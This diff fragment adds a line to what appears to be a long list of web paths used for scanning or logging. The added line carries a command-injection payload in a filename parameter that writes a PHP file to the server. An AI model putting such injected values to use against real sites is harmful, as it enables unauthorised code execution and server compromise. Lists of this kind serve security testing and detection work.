@@ -10224,3 +10224,4 @@ a
 /Login.aspx
 /cache/index.tpl.php
 /bin/cron.php
+/management/export.php?filename=$(echo+'<?php+echo+md5(9621);+?>'+>+bqvezvocekji.php)&type=pdf
